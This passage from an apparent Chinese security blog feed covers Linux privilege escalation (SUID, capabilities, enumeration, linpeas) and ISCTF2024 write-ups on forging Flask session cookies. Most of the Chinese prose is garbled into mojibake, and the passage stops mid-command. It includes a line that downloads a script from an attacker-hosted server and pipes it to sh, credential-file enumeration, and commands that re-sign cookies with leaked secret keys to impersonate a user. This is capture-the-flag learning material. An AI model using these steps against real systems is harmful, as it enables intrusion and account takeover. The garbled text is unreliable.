class="line"><span class="built_in">chmod</span> u+s /path/to/file</span><br></pre></td></tr></table></figure><p>è¿™ä¼šåœ¨æ–‡ä»¶æƒé™çš„ç”¨æˆ·æ‰§è¡Œä½ä¸Šæ·»åŠ ä¸€ä¸ª <code>s</code>ï¼Œè¡¨ç¤ºè®¾ç½®äº†SUIDä½ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªæ–‡ä»¶çš„æƒé™å¯èƒ½æ˜¾ç¤ºä¸º <code>-rwsr-xr-x</code>ï¼Œå…¶ä¸­ <code>s</code> è¡¨ç¤ºSUIDä½å·²è®¾ç½®ã€‚</p><h4 id="å®‰å…¨é£é™©"><a href="#å®‰å…¨é£é™©" class="headerlink" title="å®‰å…¨é£é™©"></a>å®‰å…¨é£é™©</h4><p>è™½ç„¶SUIDä½åœ¨æŸäº›åœºæ™¯ä¸‹éå¸¸æœ‰ç”¨ï¼Œä½†å®ƒä¹Ÿå¸¦æ¥äº†æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚å¦‚æœä¸€ä¸ªæ–‡ä»¶è®¾ç½®äº†SUIDä½å¹¶ä¸”å­˜åœ¨æ¼æ´ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨è¿™äº›æ¼æ´æå‡è‡ªå·±çš„æƒé™ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªæ™®é€šç”¨æˆ·çš„UIDè¢«ä¿®æ”¹ä¸º0ï¼ˆå³ <code>root</code> ç”¨æˆ·çš„UIDï¼‰ï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·ç™»å½•ç³»ç»Ÿæ—¶å°†è‡ªåŠ¨è·å¾— <code>root</code> æƒé™ï¼Œè¿™æ˜¾ç„¶æ˜¯éå¸¸å±é™©çš„ã€‚</p><h1 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h1><p>åœ¨ç³»ç»ŸåŠ å›ºè¿‡ç¨‹ä¸­ï¼Œåº”é‡‡å–ä»¥ä¸‹æªæ–½æ¥å‡å°‘SUIDå¸¦æ¥çš„å®‰å…¨é£é™©ï¼š</p><ol><li><p><strong>å®šæœŸå®¡è®¡</strong>ï¼š</p><ul><li>ä½¿ç”¨ <code>find</code> å‘½ä»¤æŸ¥æ‰¾æ‰€æœ‰è®¾ç½®äº†SUIDä½çš„æ–‡ä»¶ï¼š<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure></li><li>æ£€æŸ¥è¿™äº›æ–‡ä»¶æ˜¯å¦å¿…è¦è®¾ç½®SUIDä½ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™ç§»é™¤SUIDä½ï¼š<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u-s /path/to/file</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼š</p><ul><li>ç¡®ä¿åªæœ‰å¿…è¦çš„æ–‡ä»¶æ‰è®¾ç½®SUIDä½ï¼Œé¿å…ä¸å¿…è¦çš„æƒé™æå‡ã€‚</li><li>å¯¹äºå¿…é¡»è®¾ç½®SUIDä½çš„æ–‡ä»¶ï¼Œç¡®ä¿å…¶ä»£ç ç»è¿‡ä¸¥æ ¼çš„å®‰å…¨å®¡æŸ¥ï¼Œæ²¡æœ‰å·²çŸ¥æ¼æ´ã€‚</li></ul></li><li><p><strong>ç”¨æˆ·ç®¡ç†</strong>ï¼š</p><ul><li>ç¡®ä¿æ²¡æœ‰æ™®é€šç”¨æˆ·çš„UIDè¢«è®¾ç½®ä¸º0ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ï¼š<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;($3 == 0) &#123;print $1&#125;&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure></li><li>å¦‚æœå‘ç°æœ‰é <code>root</code> ç”¨æˆ·çš„UIDä¸º0ï¼Œç«‹å³ä¿®æ”¹å…¶UIDã€‚</li></ul></li><li><p><strong>æ—¥å¿—ç›‘æ§</strong>ï¼š</p><ul><li>å¯ç”¨å¹¶é…ç½®ç³»ç»Ÿæ—¥å¿—ï¼Œç›‘æ§SUIDæ–‡ä»¶çš„æ‰§è¡Œæƒ…å†µï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸è¡Œä¸ºã€‚</li></ul></li></ol><p>é€šè¿‡ä¸Šè¿°æªæ–½ï¼Œå¯ä»¥æœ‰æ•ˆåœ°ç®¡ç†å’Œæ§åˆ¶SUIDæƒé™ï¼Œå‡å°‘æ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œç¡®ä¿ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚</p><p>å…·æœ‰suidæƒé™çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap vim find bash more less nano cp awk</span><br></pre></td></tr></table></figure><p>ç›¸å…³å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ul><li><pre><code>**1. `find**``find` æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æœç´¢æ–‡ä»¶å’Œç›®å½•ã€‚å®ƒå¯ä»¥æ ¹æ®å„ç§æ¡ä»¶ï¼ˆå¦‚æ–‡ä»¶åã€å¤§å°ã€æƒé™ç­‰ï¼‰æ¥æŸ¥æ‰¾æ–‡ä»¶ã€‚2. `/``/` è¡¨ç¤ºä»æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•å¼€å§‹æœç´¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ`find` ä¼šä»ç³»ç»Ÿçš„æœ€é¡¶å±‚å¼€å§‹ï¼Œé€’å½’åœ°æœç´¢æ‰€æœ‰å­ç›®å½•ã€‚3. `-perm -u=s``-perm` é€‰é¡¹ç”¨äºæŒ‡å®šè¦æŸ¥æ‰¾çš„æ–‡ä»¶æƒé™ã€‚è¿™é‡Œçš„ `-u=s` è¡¨ç¤ºæŸ¥æ‰¾å…·æœ‰SUIDæƒé™çš„æ–‡ä»¶ã€‚- `-u` è¡¨ç¤ºç”¨æˆ·ï¼ˆuserï¼‰æƒé™ã€‚- `=s` è¡¨ç¤ºSUIDä½å·²è®¾ç½®ã€‚4. `-type f``-type` é€‰é¡¹ç”¨äºæŒ‡å®šè¦æŸ¥æ‰¾çš„æ–‡ä»¶ç±»å‹ã€‚è¿™é‡Œçš„ `f` è¡¨ç¤ºæŸ¥æ‰¾å¸¸è§„æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ç›®å½•æˆ–å…¶ä»–ç‰¹æ®Šç±»å‹çš„æ–‡ä»¶ã€‚- `f` è¡¨ç¤ºæ™®é€šæ–‡ä»¶ã€‚- å…¶ä»–å¸¸è§ç±»å‹åŒ…æ‹¬ `d`ï¼ˆç›®å½•ï¼‰ã€`l`ï¼ˆç¬¦å·é“¾æ¥ï¼‰ã€`c`ï¼ˆå­—ç¬¦è®¾å¤‡ï¼‰ç­‰ã€‚5. `2&gt;/dev/null`è¿™éƒ¨åˆ†ç”¨äºå¤„ç†å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„é”™è¯¯ä¿¡æ¯ã€‚- `2` è¡¨ç¤ºæ ‡å‡†é”™è¯¯è¾“å‡ºï¼ˆstderrï¼‰ï¼Œå®ƒæ˜¯è¿›ç¨‹çš„ç¬¬äºŒä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚- `&gt;` è¡¨ç¤ºé‡å®šå‘æ“ä½œç¬¦ï¼Œç”¨äºå°†æŸä¸ªè¾“å‡ºé‡å®šå‘åˆ°å¦ä¸€ä¸ªåœ°æ–¹ã€‚- `/dev/null` æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ï¼Œä»»ä½•å†™å…¥å®ƒçš„å†…å®¹éƒ½ä¼šè¢«ä¸¢å¼ƒã€‚è¿™é‡Œçš„ä½œç”¨æ˜¯å¿½ç•¥ `find` å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„é”™è¯¯ä¿¡æ¯ï¼Œä½¿å…¶ä¸ä¼šæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šã€‚</code></pre><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731569964890.png"></p></li></ul><p>å†™çš„å¾ˆè¯¦ç»†<a href="https://www.cnblogs.com/kqdssheng/p/18286462#id1">https://www.cnblogs.com/kqdssheng/p/18286462#id1</a></p><h1 id="Linuxææƒä¹‹ï¼šåˆ©ç”¨capabilitiesææƒ"><a href="#Linuxææƒä¹‹ï¼šåˆ©ç”¨capabilitiesææƒ" class="headerlink" title="Linuxææƒä¹‹ï¼šåˆ©ç”¨capabilitiesææƒ"></a>Linuxææƒä¹‹ï¼šåˆ©ç”¨capabilitiesææƒ</h1><p>æˆ‘ä»¬è¿è¡ŒSUIDçš„å‘½ä»¤æ—¶ï¼Œé€šå¸¸åªæ˜¯éœ€è¦ä½¿ç”¨ä¸€å°éƒ¨åˆ†ç‰¹æƒï¼Œä½†æ˜¯ä½¿ç”¨SUIDï¼Œå´å¯ä»¥æ‹¥æœ‰rootç”¨æˆ·çš„å…¨éƒ¨æƒé™ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦SUIDçš„æ–‡ä»¶å­˜åœ¨æ¼æ´ï¼Œä¾¿å¯èƒ½è¢«åˆ©ç”¨ï¼Œä»¥rootèº«ä»½æ‰§è¡Œå…¶ä»–æ“ä½œã€‚</p><p>SUIDçš„é—®é¢˜ï¼Œä¸»è¦åœ¨äºæƒé™æ§åˆ¶å¤ªç²—ç³™ã€‚ä¸ºäº†å¯¹rootèº«ä»½è¿›è¡Œæ›´åŠ ç²¾ç»†çš„æ§åˆ¶ï¼ŒLinuxå¢åŠ äº†å¦ä¸€ç§æœºåˆ¶ï¼Œå³capabilitiesã€‚</p><h2 id="Capabilitiesæœºåˆ¶"><a href="#Capabilitiesæœºåˆ¶" class="headerlink" title="Capabilitiesæœºåˆ¶"></a>Capabilitiesæœºåˆ¶</h2><p>Capabilitiesæœºåˆ¶ï¼Œæ˜¯åœ¨Linuxå†…æ ¸2.2ä¹‹åå¼•å…¥çš„ã€‚å®ƒå°†rootç”¨æˆ·çš„æƒé™ç»†åˆ†ä¸ºä¸åŒçš„é¢†åŸŸï¼Œå¯ä»¥åˆ†åˆ«å¯ç”¨æˆ–ç¦ç”¨ã€‚ä»è€Œï¼Œåœ¨å®é™…è¿›è¡Œç‰¹æƒæ“ä½œæ—¶ï¼Œå¦‚æœeuidä¸æ˜¯rootï¼Œä¾¿ä¼šæ£€æŸ¥æ˜¯å¦å…·æœ‰è¯¥ç‰¹æƒæ“ä½œæ‰€å¯¹åº”çš„capabilitiesï¼Œå¹¶ä»¥æ­¤ä¸ºä¾æ®ï¼Œå†³å®šæ˜¯å¦å¯ä»¥æ‰§è¡Œç‰¹æƒæ“ä½œã€‚</p><h4 id="ä»€ä¹ˆæ˜¯-Capabilitiesï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Capabilitiesï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Capabilitiesï¼Ÿ"></a><strong>ä»€ä¹ˆæ˜¯ Capabilitiesï¼Ÿ</strong></h4><h3 id="ç”¨å¤§ç™½è¯è§£é‡Š-Linux-çš„-Capabilities-ææƒ"><a href="#ç”¨å¤§ç™½è¯è§£é‡Š-Linux-çš„-Capabilities-ææƒ" class="headerlink" title="ç”¨å¤§ç™½è¯è§£é‡Š Linux çš„ Capabilities ææƒ"></a><strong>ç”¨å¤§ç™½è¯è§£é‡Š Linux çš„ Capabilities ææƒ</strong></h3><hr><h4 id="1-ä»€ä¹ˆæ˜¯-Capabilitiesï¼Ÿ"><a href="#1-ä»€ä¹ˆæ˜¯-Capabilitiesï¼Ÿ" class="headerlink" title="1. ä»€ä¹ˆæ˜¯ Capabilitiesï¼Ÿ"></a><strong>1. ä»€ä¹ˆæ˜¯ Capabilitiesï¼Ÿ</strong></h4><p>åœ¨ Linux é‡Œï¼Œ<strong>root ç”¨æˆ·æ‹¥æœ‰æ‰€æœ‰æƒé™</strong>ï¼Œä½†æœ‰æ—¶å€™æ™®é€šç”¨æˆ·ä¹Ÿéœ€è¦å®ŒæˆæŸäº›é«˜æƒé™æ“ä½œï¼ˆæ¯”å¦‚ä¿®æ”¹å¯†ç æˆ–ç®¡ç†ç½‘ç»œç«¯å£ï¼‰ã€‚ä¼ ç»Ÿæ–¹æ³•æ˜¯ç»™ç¨‹åºè®¾ç½® SUID æƒé™ï¼ˆç±»ä¼¼â€œä¸‡èƒ½é’¥åŒ™â€ï¼‰ï¼Œä½† SUID ä¼šè®©ç¨‹åºæ‹¥æœ‰ root çš„<strong>å…¨éƒ¨æƒé™</strong>ï¼Œé£é™©æå¤§</p><p>äºæ˜¯ Linux å¼•å…¥äº† <strong>Capabilities</strong> â€”â€” æŠŠ root çš„æƒé™æ‹†åˆ†æˆå‡ åç§â€œå°æƒé™â€ï¼Œæ¯”å¦‚</p><p>**<code>cap_setuid</code>**ï¼šå…è®¸ä¿®æ”¹ç”¨æˆ·èº«ä»½ï¼ˆæ¯”å¦‚æŠŠè‡ªå·±å˜æˆ rootï¼‰</p><p>**<code>cap_net_bind_service</code>**ï¼šå…è®¸ç»‘å®š 1024 ä»¥ä¸‹çš„ç«¯å£ï¼ˆæ¯”å¦‚ 80 ç«¯å£ï¼‰</p><p>**<code>cap_dac_override</code>**ï¼šæ— è§†æ–‡ä»¶æƒé™é™åˆ¶ï¼Œæƒ³è¯»å°±è¯»ã€æƒ³åˆ å°±åˆ </p><p>Capabilities ææƒçš„æ ¸å¿ƒæ˜¯<strong>æ»¥ç”¨ç®¡ç†å‘˜åˆ†é…çš„å°æƒé™</strong>ï¼Œç»„åˆæˆå®Œæ•´çš„ root æƒé™ã€‚å°±åƒå°å·æ‹¿åˆ°â€œè´¢åŠ¡å®¤é—¨ç¦å¡â€åï¼Œå†å·åˆ°è€æ¿çš„ä¿é™©æŸœå¯†ç ï¼Œæœ€ç»ˆæ¬ç©ºå…¬å¸ã€‚é˜²å¾¡çš„å…³é”®åœ¨äºä¸¥æ ¼æ§åˆ¶æƒé™åˆ†é…ï¼Œå®šæœŸæ¸…ç†â€œå¤šä½™çš„é’¥åŒ™</p><h1 id="æ‰‹åŠ¨æšä¸¾"><a href="#æ‰‹åŠ¨æšä¸¾" class="headerlink" title="æ‰‹åŠ¨æšä¸¾"></a>æ‰‹åŠ¨æšä¸¾</h1><h2 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h2><p>whoamiç®—æ˜¯å¾ˆåŸºç¡€çš„ä½†æ˜¯è¿™é‡Œè¿˜æ˜¯åˆ—ä¸¾ä¸€ä¸‹å…¶ä»–ç›¸ä¼¼çš„å‘½ä»¤ï¼Œä¾¿äºè·å¾—æ›´å¤šçš„ä¿¡æ¯</p><p>id who w</p><p>last æ˜¾ç¤ºç³»ç»Ÿè¿‘æœŸç™»å½•çš„è´¦æˆ·</p><p>uname -a æŸ¥çœ‹å†…æ ¸ä¿¡æ¯</p><p>lsb_release -a æ›´åŠ è¯¦ç»†çš„å†…æ ¸ä¿¡æ¯</p><p>cat &#x2F;proc&#x2F;version  ä¹Ÿèƒ½å¤Ÿæ›´åŠ è¯¦ç»†çš„å¾—åˆ°å†…æ ¸ä¿¡æ¯</p><p>hostnamectl ä¹Ÿå­˜åœ¨ä¸€äº›è¯¦ç»†çš„ä¿¡æ¯</p><p>æŸ¥çœ‹ç½‘ç»œä¿¡æ¯ </p><p>ip addr æŸ¥çœ‹å½“å‰æœºå™¨çš„ç½‘å¡</p><p>ip route æŸ¥çœ‹è·¯ç”±</p><p>ip neigh æŸ¥çœ‹é‚»å±…</p><p>arp -a æŸ¥çœ‹ç‰©ç†åœ°å€</p><p>sudo -l æŸ¥çœ‹å“ªäº›æ–‡ä»¶æ˜¯å¯ä»¥ä»¥rootçš„èº«ä»½å»æ‰§è¡Œçš„</p><p>getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null æŸ¥çœ‹&#x2F;ç›®å½•ä¸‹å“ªäº›å…·æœ‰Capabilitiesçš„æƒé™çš„èƒ½åŠ›</p><p>ls -a å°†å½“å‰æ–‡ä»¶å¤¹æ‰€æœ‰æ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥</p><p>ls -la å°†æ–‡ä»¶æ‰€æ‹¥æœ‰çš„æƒé™å†…å®¹åˆ—ä¸¾å‡ºæ¥ï¼ˆåŒ…æ‹¬-aéšè—æ–‡ä»¶ï¼‰</p><p>history åˆ—å‡ºå†å²è®°å½•</p><p>cat &#x2F;etc&#x2F;passwd è·å–å­˜å–ç”¨æˆ·ä¿¡æ¯çš„æ–‡ä»¶</p><p>cat &#x2F;etc&#x2F;crontab æŸ¥çœ‹è‡ªåŠ¨ä»»åŠ¡</p><p>æŸ¥çœ‹ç¯å¢ƒå˜é‡ env  echo $path</p><p>ps -ef æŸ¥çœ‹è¿›ç¨‹</p><p>netstat -a å°†æ‰€æœ‰ç½‘ç»œä¿¡æ¯åˆ—ä¸¾å‡ºæ¥</p><h1 id="è‡ªåŠ¨åŒ–æšä¸¾å·¥å…·"><a href="#è‡ªåŠ¨åŒ–æšä¸¾å·¥å…·" class="headerlink" title="è‡ªåŠ¨åŒ–æšä¸¾å·¥å…·"></a>è‡ªåŠ¨åŒ–æšä¸¾å·¥å…·</h1><p>linpeas</p><p>wget è¿›è¡Œä¸‹è½½ chomd èµ‹äºˆæƒé™ ç„¶åç›´æ¥ä½¿ç”¨</p><p>é‚£ä¹ˆå¦‚æœç›®æ ‡é¶æœºä¸å‡ºç½‘ æˆ‘ä»¬</p><p>å°†linpeas.shæ”»å‡»æœºå¯åŠ¨ä¸€ä¸ªhttp æœåŠ¡</p><p>sudo python3 -m   http.server 80</p><p>ç„¶åé¶æœºè®¿é—®æ”»å‡»æœºipåœ°å€å¹¶ä¸”æ‰§è¡Œ</p><p>curl xxxxxxx&#x2F;lenpeas.sh |sh</p>]]></content>
      
      
      <categories>
          
          <category> ææƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sessionä¼ªé€ </title>
      <link href="/2024/11/14/session%E4%BC%AA%E9%80%A0/"/>
      <url>/2024/11/14/session%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="flaskçš„sessionä¼ªé€ "><a href="#flaskçš„sessionä¼ªé€ " class="headerlink" title="flaskçš„sessionä¼ªé€ "></a>flaskçš„sessionä¼ªé€ </h2><h3 id="1-sessiondä½œç”¨"><a href="#1-sessiondä½œç”¨" class="headerlink" title="1.sessiondä½œç”¨"></a>1.sessiondä½œç”¨</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”±äºhttpåè®®æ˜¯ä¸€ä¸ªæ— çŠ¶æ€çš„åè®®ï¼Œä¹Ÿå°±æ˜¯è¯´åŒä¸€ä¸ªç”¨æˆ·ç¬¬ä¸€æ¬¡è¯·æ±‚å’Œç¬¬äºŒæ¬¡è¯·æ±‚æ˜¯å®Œå…¨æ²¡æœ‰å…³ç³»çš„ï¼Œä½†æ˜¯ç°åœ¨çš„ç½‘ç«™åŸºæœ¬ä¸Šæœ‰ç™»å½•ä½¿ç”¨çš„åŠŸèƒ½ï¼Œè¿™å°±è¦æ±‚å¿…é¡»å®ç°æœ‰çŠ¶æ€ï¼Œè€Œsessionæœºåˆ¶å®ç°çš„å°±æ˜¯è¿™ä¸ªåŠŸèƒ½ã€‚</span><br><span class="line">ç”¨æˆ·ç¬¬ä¸€æ¬¡è¯·æ±‚åï¼Œå°†äº§ç”Ÿçš„çŠ¶æ€ä¿¡æ¯ä¿å­˜åœ¨sessionä¸­ï¼Œè¿™æ—¶å¯ä»¥æŠŠsessionå½“åšä¸€ä¸ªå®¹å™¨ï¼Œå®ƒä¿å­˜äº†æ­£åœ¨ä½¿ç”¨çš„æ‰€æœ‰ç”¨æˆ·çš„çŠ¶æ€ä¿¡æ¯ï¼›è¿™æ®µçŠ¶æ€ä¿¡æ¯åˆ†é…äº†ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ç”¨æ¥æ ‡è¯†ç”¨æˆ·çš„èº«ä»½ï¼Œå°†å…¶ä¿å­˜åœ¨å“åº”å¯¹è±¡çš„cookieä¸­ï¼›å½“ç¬¬äºŒæ¬¡è¯·æ±‚æ—¶ï¼Œè§£æcookieä¸­çš„æ ‡è¯†ç¬¦ï¼Œæ‹¿åˆ°æ ‡è¯†ç¬¦åå»sessionæ‰¾åˆ°å¯¹åº”çš„ç”¨æˆ·çš„ä¿¡æ¯</span><br></pre></td></tr></table></figure><h3 id="2-flask-sessionçš„å‚¨å­˜æ–¹å¼"><a href="#2-flask-sessionçš„å‚¨å­˜æ–¹å¼" class="headerlink" title="2.flask sessionçš„å‚¨å­˜æ–¹å¼"></a>2.flask sessionçš„å‚¨å­˜æ–¹å¼</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç¬¬ä¸€ç§æ–¹å¼ï¼šç›´æ¥å­˜åœ¨å®¢æˆ·ç«¯çš„cookiesä¸­</span><br><span class="line"></span><br><span class="line">ç¬¬äºŒç§æ–¹å¼ï¼šå­˜å‚¨åœ¨æœåŠ¡ç«¯ï¼Œå¦‚ï¼šredis,memcached,mysqlï¼Œfile,mongodbç­‰ç­‰ï¼Œå­˜åœ¨flask-sessionç¬¬ä¸‰æ–¹åº“</span><br><span class="line"></span><br><span class="line">flaskçš„sessionå¯ä»¥ä¿å­˜åœ¨å®¢æˆ·ç«¯çš„cookieä¸­ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿä¸€å®šçš„å®‰å…¨é—®é¢˜ã€‚</span><br></pre></td></tr></table></figure><h3 id="3-flaskçš„sessionæ ¼å¼"><a href="#3-flaskçš„sessionæ ¼å¼" class="headerlink" title="3.flaskçš„sessionæ ¼å¼"></a>3.flaskçš„sessionæ ¼å¼</h3><p>flaskçš„sessionæ ¼å¼ä¸€èˆ¬æ˜¯ç”±base64åŠ å¯†çš„Sessionæ•°æ®(ç»è¿‡äº†jsonã€zlibå‹ç¼©å¤„ç†çš„å­—ç¬¦ä¸²) . æ—¶é—´æˆ³ . ç­¾åç»„æˆçš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0</span><br><span class="line">sessionæ•°æ®                                     æ—¶é—´æˆ³       ç­¾å               </span><br></pre></td></tr></table></figure><p>æ—¶é—´æˆ³ï¼šç”¨æ¥å‘Šè¯‰æœåŠ¡ç«¯æ•°æ®æœ€åä¸€æ¬¡æ›´æ–°çš„æ—¶é—´ï¼Œè¶…è¿‡31å¤©çš„ä¼šè¯ï¼Œå°†ä¼šè¿‡æœŸï¼Œå˜ä¸ºæ— æ•ˆä¼šè¯ï¼›</p><p>ç­¾åï¼šæ˜¯åˆ©ç”¨<code>Hmac</code>ç®—æ³•ï¼Œå°†sessionæ•°æ®å’Œæ—¶é—´æˆ³åŠ ä¸Š<code>secret_key</code>åŠ å¯†è€Œæˆçš„ï¼Œç”¨æ¥ä¿è¯æ•°æ®æ²¡æœ‰è¢«ä¿®æ”¹ã€‚</p><h3 id="4ã€flask-sessionä¼ªé€ "><a href="#4ã€flask-sessionä¼ªé€ " class="headerlink" title="4ã€flask sessionä¼ªé€ "></a>4ã€flask sessionä¼ªé€ </h3><p>ä¸Šé¢æˆ‘ä»¬è¯´åˆ°flask sessionæ˜¯åˆ©ç”¨hmacç®—æ³•å°†sessionæ•°æ®ï¼Œæ—¶é—´æˆ³åŠ ä¸Šsecert_keyæˆçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦è¿›è¡Œsessionä¼ªé€ å°±è¦å…ˆå¾—åˆ°secret_keyï¼Œå½“æˆ‘ä»¬å¾—åˆ°secret_keyæˆ‘ä»¬å°±å¯ä»¥å¾ˆè½»æ¾çš„è¿›è¡Œsessionä¼ªé€ ã€‚</p><p>sessionä¼ªé€ å·¥å…·ï¼š<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><h2 id="ISCTF2024ã€å°è“é²¨çš„æ•…äº‹ã€‘"><a href="#ISCTF2024ã€å°è“é²¨çš„æ•…äº‹ã€‘" class="headerlink" title="ISCTF2024ã€å°è“é²¨çš„æ•…äº‹ã€‘"></a>ISCTF2024ã€å°è“é²¨çš„æ•…äº‹ã€‘</h2><p>å°±æ˜¯ä¸€ä¸ªç®€å•çš„sessionä¼ªé€  </p><p>é¡µé¢å°±æ˜¯ä¸€ä¸ªç®€å•çš„é‡å®šå‘</p><p>ç„¶åç”¨dirsearch æ‰«æå‘ç°ä¸¤ä¸ª&#x2F;robots.txt &#x2F;flag</p><p>ç›´æ¥è¿›å…¥&#x2F;flag å‘ç°æ˜¯è¿›ä¸å»çš„ &#x2F;robots.txt å¯ä»¥å‘ç° æœ‰ä¸œè¥¿ ç»“åˆæç¤º å‘ç°è¿™å°±æ˜¯key </p><p>é‚£ä¹ˆ &#x2F;flag å¯ä»¥çœ‹åˆ°cookie å­˜å‚¨çš„æ˜¯session</p><p>key:SAVPiEkH</p><p>cookie:eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZzrK2w.LGOmPBs5fB1pWbP-U5MABqrwxAw</p><p>æˆ‘ä»¬åˆ©ç”¨flask-session-cookie-manager</p><p>å…ˆå°† è¿™æ®µsession è§£ç  å‘ç°</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZzrK2w.LGOmPBs5fB1pWbP-U5MABqrwxAw&#x27; -s &#x27;SAVPiEkH&#x27;</span><br><span class="line"></span><br><span class="line">&#123;&#x27;username&#x27;: b&#x27;www-data&#x27;&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°{â€˜usernameâ€™: bâ€™www-dataâ€™}</p><p>ä½†æ˜¯ä¸çŸ¥é“è¦æ€ä¹ˆä¼ªé€ æˆä»€ä¹ˆ   admin  root éƒ½è¯•è¿‡äº†å½“æ—¶åšé¢˜å¡åœ¨è¿™ </p><p>æœ€åçœ‹wp å‘ç°æœ‰ä¸€ä¸ª&#x2F;Hacker</p><p>æ˜¾ç¤ºä»–å«ISctf_Hacker</p><p>ã€‚ã€‚dirsearch æ²¡æœ‰è¿™ä¸ªå­—å…¸ (ï½¡ï½¥âˆ€ï½¥)ï¾‰ï¾å—¨</p><p>æˆ‘ä»¬ä¼ªé€ æˆISctf_Hacker å³å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s&#x27;SAVPiEkH&#x27; -t &quot;&#123;&#x27;username&#x27;: b&#x27;ISctf_Hacker&#x27;&#125;&quot;</span><br><span class="line">eyJ1c2VybmFtZSI6eyIgYiI6IlNWTmpkR1pmU0dGamEyVnkifX0.ZzrMVA.NdDmowaV2YVPWJfUjnsAR6DDrfc</span><br></pre></td></tr></table></figure><p>eyJ1c2VybmFtZSI6eyIgYiI6IlNWTmpkR1pmU0dGamEyVnkifX0.ZzrMVA.NdDmowaV2YVPWJfUjnsAR6DDrfc</p><p>å°†è¿™ä¸ªä¼ å…¥ &#x2F;flag çš„cookie å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISCTF&#123;8534881b-b09d-4811-9da2-40695b41c158&#125;</span><br></pre></td></tr></table></figure><h2 id="ISCTF2024ã€æ–°é—»ç³»ç»Ÿã€‘"><a href="#ISCTF2024ã€æ–°é—»ç³»ç»Ÿã€‘" class="headerlink" title="ISCTF2024ã€æ–°é—»ç³»ç»Ÿã€‘"></a>ISCTF2024ã€æ–°é—»ç³»ç»Ÿã€‘</h2><p>ç»™äº†ä¸€ä¸ªç™»å½•ç•Œé¢ å°è¯• admin  å¼±å£ä»¤çˆ†ç ´ æ²¡æˆåŠŸ</p><p>ç„¶å å°±çœ‹äº†ä¸‹cookie å‘ç°æœ‰session é‚£å°±ç›´æ¥æ‰¾key</p><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªé™„ä»¶ </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.config[&quot;SECRET_KEY&quot;] = &quot;W3l1com_isCTF&quot;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç»™äº†</p><p>æˆ‘ä»¬è§£ç çœ‹ä¸‹æ˜¯ä¸ªå•¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c 